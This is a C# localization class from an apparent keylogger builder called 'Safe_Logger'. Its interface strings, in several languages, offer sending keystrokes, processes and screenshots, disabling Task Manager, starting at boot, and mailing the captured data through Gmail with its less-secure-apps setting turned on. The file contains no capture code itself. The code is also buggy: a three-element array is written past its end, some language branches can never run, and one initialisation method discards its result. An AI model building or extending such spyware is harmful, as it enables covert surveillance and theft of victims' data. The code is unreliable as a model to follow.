using System;
using System.Globalization;
using System.IO;

namespace Safe_Logger
{
    class LanguageManager
    {
        public static LanguageManager getInstance; public static void init() { getInstance = new LanguageManager(); }

        public string language { get; set; } = "eng";

        public string[] updateLanguage(int formId, string lang)
        {
            string oldLang = language;
            language = lang;
            string[] final;

            if (formId == 1)
            {
                final = new string[3];
            }
            else
            {
                final = new string[50];
            }

            if (language != "eng" && language != "gr" && language != "bg" && language != "hb")
            {
                Utils.log("Error on changing the language! Setting to English!");
                language = "eng";
            }

            if (formId == 1)
            {
                if (language == "eng")
                {
                    final[0] = "Please enter your license key:";
                    final[1] = "Enter";
                    final[2] = "Exit";
                    final[3] = "Use Voice";
                    final[4] = "is set to ";
                    final[5] = "true";
                    final[6] = "false";
                }
                else if (language == "gr")
                {
                    final[0] = "Παρακαλώ εισάγετε το κλείδι άδειας χρήσης:";
                    final[1] = "Συνέχεια";
                    final[2] = "Έξωδος";
                    final[3] = "Χρήση φωνής";
                    final[4] = "είναι ";
                    final[5] = "σωστό";
                    final[6] = "λάθος";
                }
                else if (language == "bg")
                {
                    final[0] = "Моля, въведете своя лицензен ключ:";
                    final[1] = "Вход";
                    final[2] = "Изход";
                    final[3] = "Use Voice";
                    final[4] = "is set to ";
                    final[5] = "true";
                    final[6] = "false";
                }
                else if (language == "hb")
                {
                    final[0] = "בבקשה הקש רשיון תוכנה:";
                    final[1] = "הכנס";
                    final[2] = "יציאה";
                    final[3] = "Use Voice";
                    final[4] = "is set to ";
                    final[5] = "true";
                    final[6] = "false";
                }
                else if (language == "li")
                {
                    final[0] = "Prašome įvesti licensijos koda:";
                    final[1] = "Pirmyn";
                    final[2] = "Išeiti";
                    final[3] = "Use Voice";
                    final[4] = "is set to ";
                    final[5] = "true";
                    final[6] = "false";
                }
            }
            else if (formId == 2)
            {
                if (language == "eng")
                {
                    final[0] = "Send Keystrokes";
                    final[1] = "Send Processes";
                    final[2] = "Send Screenshots";
                    final[3] = "Every";
                    final[4] = "Minute";
                    final[5] = "Build Name";
                    final[6] = "Build";
                    final[7] = "Exit";
                    final[8] = "Disable Task Manager";
                    final[9] = "Make the Program Start Up";
                    final[10] = "Shutdown Pc on Exit";
                    final[11] = "Send Data By";
                    final[12] = "Lan";
                    final[13] = "Smtp Port";
                    final[14] = "Better let it 587";
                    final[15] = "Email";
                    final[16] = "Password";
                    final[17] = "Email Subject";
                    final[18] = "URL";
                    final[19] = "Username";
                    final[20] = "Password";
                    final[21] = "Port";
                    final[22] = "IP";
                    final[23] = "How to Use:";
                    final[24] = "Main Options Tab:";
                    final[25] = "Build Name must not have .exe at the ending!";
                    final[26] = "Change Language";
                    final[27] = "English";
                    final[28] = "Greek";
                    final[29] = "Email Settings";
                    final[30] = "You can use Gmail only and you have to update the options to let less secure apps to connect!";
                    final[31] = "Bulgarian";
                    final[32] = "Hebrew";
                    final[33] = "German";
                    final[34] = "French";
                    final[35] = "Lithuanian";
                    final[36] = "Path";
                    final[37] = "Working Hours:";
                    final[38] = "Work all day";
                    final[39] = "Support";
                    final[40] = "Keywords:";
                }
                else if (language == "gr")
                {
                    final[0] = "Αποστολή Πλήκτρων";
                    final[1] = "Αποστολή Διεργασιών";
                    final[2] = "Αποστολή Screenshots";
                    final[3] = "Κάθε";
                    final[4] = "Λεπτό";
                    final[5] = "Όνομα Προγράμματος Εξόδου";
                    final[6] = "Δημιουργία";
                    final[7] = "Έξοδος";
                    final[8] = "Απενεργοποίηση του Διαχειριστή Εργασιών";
                    final[9] = "Μετατροπή του Προγράμματος σε Start Up";
                    final[10] = "Απενεργοποίηση του Ύπολογιστη κατα την Έξοδο";
                    final[11] = "Αποστολή Δεδομένων Με";
                    final[12] = "Lan";
                    final[13] = "Smtp Πόρτα";
                    final[14] = "Καλύτερα αφίστετο σε 587";
                    final[15] = "Email";
                    final[16] = "Κωδικός";
                    final[17] = "Θέμα Μηνύματος";
                    final[18] = "URL";
                    final[19] = "Όνομα Χρήστη";
                    final[20] = "Κωδικός";
                    final[21] = "Πόρτα";
                    final[22] = "IP";
                    final[23] = "Οδηγίες Χρήσης:";
                    final[24] = "Καρτέλα Main Options:";
                    final[25] = "Το όνομα εξόδου δεν πρέπει να έχει .exe στο τέλος!";
                    final[26] = "Αλλαγή Γλώσσας";
                    final[27] = "Αγγλικά";
                    final[28] = "Ελληνικά";
                    final[29] = "Ρυθμίσεις Email";
                    final[30] = "Μπορείτε να χρησιμοποιήσεται μονο Gmail και θα πρέπει να επιτρέψεται από τις ρυθμίσεις την σύνδεση από λιγότερο ασφαλείς εφαρμογές!";
                    final[31] = "Βουλγάρικα";
                    final[32] = "Εβραϊκά";
                    final[33] = "Γερμανικά";
                    final[34] = "Γαλλικά";
                    final[35] = "Λιθουανικά";
                    final[36] = "Μονοπάτι";
                    final[37] = "Ώρες Εργασίας:";
                    final[38] = "Όλη Μέρα";
                    final[39] = "Βοήθεια";
                    final[40] = "Λέξεις Κλειδιά:";
                }
                else if (language == "bg")
                {
                    final[0] = "Изпрати клавишни натискания";
                    final[1] = "Изпрати процеси";
                    final[2] = "Изпрати снимки";
                    final[3] = "Всеки";
                    final[4] = "Минути";
                    final[5] = "Име на билда";
                    final[6] = "Експортирай";
                    final[7] = "Изход";
                    final[8] = "Деактивирай Task Manager";
                    final[9] = "Стартирай програмата с включването на Windows";
                    final[10] = "Изключи компютъра при изход";
                    final[11] = "Изпрати данни по";
                    final[12] = "Lan";
                    final[13] = "Smtp Port";
                    final[14] = "По-добре го оставете на 587";
                    final[15] = "Имейл";
                    final[16] = "Парола";
                    final[17] = "Тема на имейла";
                    final[18] = "URL";
                    final[19] = "Потребителско име";
                    final[20] = "Парола";
                    final[21] = "Port";
                    final[22] = "IP";
                    final[23] = "Как се използва:";
                    final[24] = "Раздел: Главни настройки:";
                    final[25] = "Името на билда не трябва да има .exe накрая!";
                    final[26] = "Смени езика";
                    final[27] = "Английски";
                    final[28] = "Гръцки";
                    final[29] = "Настройки на имейла";
                    final[30] = "Можете да използвате само Gmail и трябва да актуализирате опциите, за да позволите на по-малко сигурни приложения да се свързват!";
                    final[31] = "Български";
                    final[32] = "Иврит";
                    final[33] = "German";
                    final[34] = "French";
                    final[35] = "Lithuanian";
                    final[36] = "Path";
                    final[37] = "Working Hours:";
                    final[38] = "Work all day";
                    final[39] = "Support";
                    final[40] = "Keywords:";
                }
                else if (language == "hb")
                {
                    final[0] = "שלח הקשות"; final[1] = "שלח תהליכים"; final[2] = "שלח צילומי מסך"; final[3] = "כל"; final[4] = "דקה"; final[5] = "שם התוכנה"; final[6] = "צור"; final[7] = "יציאה"; final[8] = "השבת את מנהל המשימות"; final[9] = "הפעל את התוכנה בהדלקת המחשב"; final[10] = "כבה את המחשב ביציאה"; final[11] = "שלח מידע על"; final[12] = "Lan"; final[13] = "Smtp פורט"; final[14] = "עדיף לכתוב 587"; final[15] = "אימייל"; final[16] = "סיסמא"; final[17] = "נושא באימייל"; final[18] = "קישור"; final[19] = "שם משתמש"; final[20] = "סיסמא"; final[21] = "פורט"; final[22] = "אייפי"; final[23] = "איך להשתמש:"; final[24] = "לשונית אפשרויות ראשית:"; final[25] = "בשם בתכונה אסור שיהיה .exe בסוף!"; final[26] = "שנה שפה"; final[27] = "אנגלית"; final[28] = "יוונית"; final[29] = "הגדרות אימייל"; final[30] = "אתה יכול להשתמש ב Gmail בלבד ואתה צריך לעדכן את האפשריות כדי לתת לאפלקציות פחות בטוחות להתחבר!";
                    final[31] = "בולגרית"; final[32] = "עברית";
                    final[33] = "גרמנית"; final[34] = "צרפתית";
                    final[35] = "ליטאית";
                    final[36] = "נתיב";
                    final[37] = "שעות פעילות:"; final[38] = "פועל כל היום"; final[39] = "תמיכה"; final[40] = "מילות מפתח:";
                }
                else if (language == "ger")
                {
                    final[0] = "Send Keystrokes";
                    final[1] = "Send Processes";
                    final[2] = "Send Screenshots";
                    final[3] = "Every";
                    final[4] = "Minute";
                    final[5] = "Build Name";
                    final[6] = "Build";
                    final[7] = "Exit";
                    final[8] = "Disable Task Manager";
                    final[9] = "Make the Program Start Up";
                    final[10] = "Shutdown Pc on Exit";
                    final[11] = "Send Data By";
                    final[12] = "Lan";
                    final[13] = "Smtp Port";
                    final[14] = "Better let it 587";
                    final[15] = "Email";
                    final[16] = "Password";
                    final[17] = "Email Subject";
                    final[18] = "URL";
                    final[19] = "Username";
                    final[20] = "Password";
                    final[21] = "Port";
                    final[22] = "IP";
                    final[23] = "How to Use:";
                    final[24] = "Main Options Tab:";
                    final[25] = "Build Name must not have .exe at the ending!";
                    final[26] = "Change Language";
                    final[27] = "English";
                    final[28] = "Greek";
                    final[29] = "Email Settings";
                    final[30] = "You can use Gmail only and you have to update the options to let less secure apps to connect!";
                    final[31] = "Bulgarian";
                    final[32] = "Hebrew";
                    final[33] = "German";
                    final[34] = "French";
                    final[35] = "Lithuanian";
                    final[36] = "Path";
                    final[37] = "Working Hours:";
                    final[38] = "Work all day";
                    final[39] = "Support";
                    final[40] = "Keywords:";
                }
                else if (language == "fr")
                {
                    final[0] = "Send Keystrokes";
                    final[1] = "Send Processes";
                    final[2] = "Send Screenshots";
                    final[3] = "Every";
                    final[4] = "Minute";
                    final[5] = "Build Name";
                    final[6] = "Build";
                    final[7] = "Exit";
                    final[8] = "Disable Task Manager";
                    final[9] = "Make the Program Start Up";
                    final[10] = "Shutdown Pc on Exit";
                    final[11] = "Send Data By";
                    final[12] = "Lan";
                    final[13] = "Smtp Port";
                    final[14] = "Better let it 587";
                    final[15] = "Email";
                    final[16] = "Password";
                    final[17] = "Email Subject";
                    final[18] = "URL";
                    final[19] = "Username";
                    final[20] = "Password";
                    final[21] = "Port";
                    final[22] = "IP";
                    final[23] = "How to Use:";
                    final[24] = "Main Options Tab:";
                    final[25] = "Build Name must not have .exe at the ending!";
                    final[26] = "Change Language";
                    final[27] = "English";
                    final[28] = "Greek";
                    final[29] = "Email Settings";
                    final[30] = "You can use Gmail only and you have to update the options to let less secure apps to connect!";
                    final[31] = "Bulgarian";
                    final[32] = "Hebrew";
                    final[33] = "German";
                    final[34] = "French";
                    final[35] = "Lithuanian";
                    final[36] = "Path";
                    final[37] = "Working Hours:";
                    final[38] = "Work all day";
                    final[39] = "Support";
                    final[40] = "Keywords:";
                }
                else if (language == "li")
                {
                    final[0] = "Išsiūsti klaveturos paspaudimus"; final[1] = "Išsiūsti procesa"; final[2] = "Išsiūsti ekrano kopija"; final[3] = "Kekviena"; final[4] = "Minute"; final[5] = "Pastatyti pavadinima"; final[6] = "Pastatyti"; final[7] = "Išeiti"; final[8] = "Blokuoti "; final[9] = "Įjunkite programa"; final[10] = "įšjungti PC išeinant"; final[11] = "įšsiūsti Data Su"; final[12] = "Lan"; final[13] = "Smtp Port"; final[14] = "Geriau leiskit 587"; final[15] = "Elektroninis Paštas"; final[16] = "Slaptažodis"; final[17] = "Email Tema"; final[18] = "URL"; final[19] = "Vartotojas"; final[20] = "Slaptažodis"; final[21] = "Port"; final[22] = "IP Adresas"; final[23] = "Kaip naudotis:"; final[24] = "Pagrindinių nustatymų lentele:"; final[25] = "Išsugeneruojamas failas negali turėti .exe pavadinime!"; final[26] = "Keisti Kalba"; final[27] = "Anglų"; final[28] = "Graikų"; final[29] = "Email Nustatymai"; final[30] = "Jūs privalote tureti gmail ir dar išjungti apsauga nuo nepatikimu programeliu kad prisijungtumete!"; final[31] = "Bulgarų"; final[32] = "Hebrajų"; final[33] = "Vokiečių"; final[34] = "Prancūzų";
                    final[35] = "Lietuvių";
                    final[36] = "Kelias";
                    final[37] = "Darbo valandos:"; final[38] = "Dirbti Visa dieną";
                    final[39] = "Pagalba";
                    final[40] = "Žodžiai:";
                }
            }

            if (oldLang != language)
            {
                saveLanguage(language);
            }

            return final;
        }

        string path = Directory.GetCurrentDirectory() + "/options/languages/lang.txt";
        string dirPath = "/options";

        public void saveLanguage(string lang)
        {
            lang = lang.Trim();

            if (!Directory.Exists(dirPath))
            {
                Directory.CreateDirectory(dirPath);
            }

            if (!File.Exists(path))
            {
                var file = File.Create(path);
                file.Close();
                File.WriteAllText(path, lang);
            }
            else
            {
                File.Delete(path);
                var file = File.Create(path);
                file.Close();
                File.WriteAllText(path, lang);
            }
        }

        public string loadLanguage()
        {
            string final = "";
            
            if (!Directory.Exists(dirPath))
            {
                Directory.CreateDirectory(dirPath);
            }

            if (!File.Exists(path))
            {
                final = "eng";
                Utils.log("Language Option File not found! Setting to English!");
                saveLanguage(final);
            }
            else
            {
                final = File.ReadAllText(path).Trim();
            }

            return final;
        }

        public void languageInit()
        {
            if (Utils.initFirstTime())
            {
                if (!File.Exists(path))
                {
                    CultureInfo ci = CultureInfo.CurrentCulture;

                    string lang = ci.Name;
                    string finalLang = "eng";

                    if (lang == "en-GB" || lang == "en-US")
                    {
                        finalLang = "eng";
                    }
                    else if (lang == "gr")
                    {
                        finalLang = "gr";
                    }
                }
            }
        }
    }
}
